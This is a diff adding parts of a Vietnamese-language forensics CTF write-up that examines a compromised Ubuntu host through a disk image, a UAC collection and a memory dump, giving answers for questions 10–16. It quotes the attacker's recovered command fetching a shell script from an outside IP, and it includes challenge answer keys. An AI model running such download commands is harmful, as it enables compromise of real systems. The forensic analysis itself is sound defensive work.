@@ -14,6 +14,8 @@ Nhiệm vụ của mình là đóng vai người phân tích điều tra số: d
 
 Các công cụ sử dụng trong bài: FTK Imager, Notepad++, grep, awk.
 
+
+## Phần 1: File sdb.vhd
 ### Câu 1: There is a script that runs every minute to do cleanup. What is the name of the file?
 
 - Đề bài gợi ý đây là một tác vụ lên lịch chạy mỗi phút, thường được cấu hình bằng cron job. Crontab của từng user trên Ubuntu được lưu tại /var/spool/cron/crontabs/, nên mình mở file ảnh đĩa sdb.vhd bằng FTK Imager và đi theo đường dẫn [root] → var → spool → cron → crontabs.
@@ -103,3 +105,69 @@ Các công cụ sử dụng trong bài: FTK Imager, Notepad++, grep, awk.
 <img width="1336" height="633" alt="image" src="https://github.com/user-attachments/assets/1095d993-6208-4100-a0eb-2eaa285d1342" />
 
 ** Đáp án: ** `0_cron.sh,0_linux.sh, ap.sh`
+
+## Phần 2: File UAC
+
+### Câu 10 : Two suspicious processes were running from a deleted directory. What are their PIDs?
+
+- Vì khi một tiến trình chạy từ thư mục hoặc file đã bị xóa, Linux gắn chuỗi `(deleted)` vào đường dẫn của nó, nên mình sẽ giải nén `uac.tgz` và dùng `grep "deleted" *` trong thư mục `live_response/process`.
+- Kết quả mình nhận được là hai tiến trình có thư mục làm việc (`cwd`) nằm trong thư mục đã bị xóa `/var/tmp/.log/101068/.spoollog` là tiến trình `sleep` có PID **6388** và tiến trình `sh` có PID **20645**. Tiến trình `sh` còn đang mở file `.src.sh` cũng đã bị xóa.
+
+<img width="1806" height="486" alt="image" src="https://github.com/user-attachments/assets/28fbeecd-8504-4692-8f45-b10b8eaa8207" />
+
+**Đáp án:** `6388, 20645`
+
+### Câu 11: What is the suspicious command line associated with the PID that ends with `45` in Q10?
+
+- Theo đề bài thì mình sẽ tìm PID `20645` này trong dữ liệu tiến trình của UAC để xem dòng lệnh đầy đủ và mình phát hiện thấy tiến trình chạy lệnh **`sh .src.sh`
+
+<img width="1877" height="630" alt="image" src="https://github.com/user-attachments/assets/4ffea901-182b-4e5d-8113-277d0bc34612" />
+
+**Đáp án:** `sh .src.sh`
+
+### Câu 12: What is the suspicious command line associated with the PID that ends with `45` in Q10?
+
+- Tiến trình thứ hai ở câu 10 là PID **20645**. Mình tìm trong dữ liệu UAC thu thập từ tiến trình này (thư mục live_response/process/proc/20645) và đọc file `environ`, nơi lưu biến môi trường của tiến trình, sau đó mình phát hiện được` REMOTE_ADDR=116.202.187.77` và `REMOTE_PORT=56590
+
+** Đáp án: ** `116.202.187.77:56590`
+
+### Câu 13: Which user was responsible for executing the command in Q11?
+
+- Vì ở kết quả câu 11 cũng đã cho thấy rõ user thực hiện lệnh sh `sh .src.sh` đó chính là ` daemon`
+
+<img width="1877" height="630" alt="image" src="https://github.com/user-attachments/assets/4ffea901-182b-4e5d-8113-277d0bc34612" />
+
+** Đáp án: ** `daemon`
+
+### Câu 14: Two suspicious shell processes were running from the tmp folder. What are their PIDs?
+
+- Mình tiếp tục phân tích dữ liệu tiến trình của UAC trong `live_response/process` và tìm các tiến trình có liên quan đến tmp thì phát hiện có 2 tiến trình shell `sh` có ID là ` 15853 ` và `21785 `
+
+<img width="1851" height="340" alt="image" src="https://github.com/user-attachments/assets/bc3faf2d-ade6-4c21-9dce-4ec79147bccc" />
+
+
+- Mình đối chiếu với `running_processes_full_paths.txt` thì xác nhận đây chính xác là các tiến trình shell.
+
+<img width="947" height="42" alt="image" src="https://github.com/user-attachments/assets/98605ea5-a7b7-43af-8607-5c47105ad569" />
+
+<img width="953" height="33" alt="image" src="https://github.com/user-attachments/assets/9a232b5f-15c0-4666-b1bc-e63f36e194ed" />
+
+
+**Đáp án:** `15853,21785`
+
+### Phần 3: File ubuntu.20211218.mem
+#### Câu 15: What is the MAC address of the captured memory?
+
+- Mình sẽ giải nén `ubuntu.20211208.mem`, trích xuất chuỗi bằng `strings` rồi dùng `grep` tìm các địa chỉ MAC kết thúc bằng `16`
+<img width="1111" height="208" alt="image" src="https://github.com/user-attachments/assets/df1572a4-e5cc-4613-84f9-211522749556" />
+
+**Đáp án:** `00:22:48:26:3b:16`
+
+#### Câu 16: Based on Bash history. The attacker downloaded the SH script. What is the name of the file?
+
+- Ở phần này mình sẽ sử dụng  plugin linux_bash của Volatility để trích xuất lịch sử lệnh từ các phiên bash đang hoạt động và nhận được kết quả là kẻ tấn công đã thực hiện lệnh  `wget http://185.191.32.198/unk.sh`
+
+
+<img width="1052" height="120" alt="image" src="https://github.com/user-attachments/assets/0eeed895-3b23-445e-860e-a825ab273869" />
+
+**Đáp án:** `unk.sh`
